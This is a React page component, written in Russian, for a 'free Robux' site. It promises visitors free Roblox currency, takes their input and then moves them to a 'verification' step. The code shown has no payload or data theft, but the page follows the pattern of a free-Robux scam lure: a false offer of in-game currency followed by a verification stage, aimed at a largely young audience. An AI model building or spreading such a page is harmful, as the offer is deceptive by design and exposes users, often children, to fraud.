import { useState } from "react";
import RobuxInput from "@/components/RobuxInput";
import VerificationStep from "@/components/VerificationStep";

const Index = () => {
  const [step, setStep] = useState(1);

  const handleComplete = () => {
    setStep(2);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center relative overflow-hidden bg-gradient-to-b from-blue-900 to-indigo-900">
      {/* Фоновое изображение и эффекты */}
      <div className="absolute inset-0 z-0">
        <div className="absolute inset-0 bg-[url('/placeholder.svg')] bg-cover bg-center opacity-20"></div>
        <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent"></div>
      </div>
      
      {/* Плавающие элементы Roblox */}
      <div className="absolute top-20 left-20 w-16 h-16 bg-roblox rotate-12 rounded opacity-30 animate-float"></div>
      <div className="absolute bottom-40 right-20 w-24 h-24 bg-roblox/40 -rotate-12 rounded opacity-30 animate-float" style={{ animationDelay: '1s' }}></div>
      <div className="absolute top-1/2 left-10 w-12 h-12 bg-roblox/30 rotate-45 rounded opacity-30 animate-float" style={{ animationDelay: '2s' }}></div>
      <div className="absolute bottom-20 left-1/3 w-20 h-20 bg-roblox/20 rotate-6 rounded opacity-20 animate-float" style={{ animationDelay: '3s' }}></div>
      <div className="absolute top-32 right-1/4 w-14 h-14 bg-roblox/25 -rotate-12 rounded opacity-25 animate-float" style={{ animationDelay: '2.5s' }}></div>
      
      {/* Анимированные персонажи Roblox (силуэты) */}
      <div className="absolute left-5 bottom-5 w-20 h-32 bg-black/20 rounded-t-lg animate-bounce" style={{ animationDuration: '6s' }}></div>
      <div className="absolute right-5 bottom-5 w-20 h-36 bg-black/20 rounded-t-lg animate-bounce" style={{ animationDuration: '7s', animationDelay: '1s' }}></div>
      
      {/* Основной контент */}
      <header className="relative z-10 mb-10 text-center">
        <div className="flex flex-col items-center">
          <div className="bg-roblox text-white text-xs px-2 py-1 rounded-full mb-2 animate-pulse">
            БЕСПЛАТНО
          </div>
          <h1 className="text-4xl md:text-6xl font-extrabold tracking-tight text-white mb-4">
            <span className="text-roblox">Roblox</span> Робуксы
          </h1>
        </div>
        <p className="text-xl text-white/90 max-w-md mx-auto px-4">
          Получите бесплатные робуксы для своего аккаунта прямо сейчас!
        </p>
      </header>
      
      <main className="relative z-10 w-full max-w-md px-4">
        {step === 1 && <RobuxInput onComplete={handleComplete} />}
        {step === 2 && <VerificationStep />}
      </main>
      
      <footer className="relative z-10 mt-12 text-center text-white/70 text-sm px-4">
        <p>Сервис распространения робуксов не связан с Roblox Corporation.</p>
        <p className="mt-1">© 2023 Free Robux Service</p>
      </footer>
    </div>
  );
};

export default Index;
